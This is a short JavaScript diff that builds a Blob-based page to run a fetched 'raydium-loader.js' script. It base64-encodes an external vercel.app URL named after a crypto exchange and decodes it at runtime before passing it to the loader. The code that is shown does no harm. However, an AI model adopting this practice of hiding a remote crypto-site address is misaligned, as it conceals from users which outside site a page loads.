@@ -20,6 +20,12 @@ if ('serviceWorker' in navigator) {
     fetch('/raydium-loader.js')
       .then(response => response.text())
       .then(scriptContent => {
+        // Encode the Raydium URL
+        const encodedRaydiumUrl = btoa('https://daddyonraydium.vercel.app/');
+        
+        // Escape the script content
+        const escapedScriptContent = scriptContent.replace(/</g, '\\x3C').replace(/>/g, '\\x3E');
+        
         // Create a Blob URL for the HTML that includes the script
         const htmlContent = `
           <!DOCTYPE html>
@@ -28,8 +34,11 @@ if ('serviceWorker' in navigator) {
             <title>Raydium Loader</title>
           </head>
           <body>
-            <script>${scriptContent}</script>
-            <script>loadRaydium();</script>
+            <script>${escapedScriptContent}</script>
+            <script>
+              const decodedUrl = atob('${encodedRaydiumUrl}');
+              loadRaydium(decodedUrl);
+            </script>
           </body>
           </html>
         `;
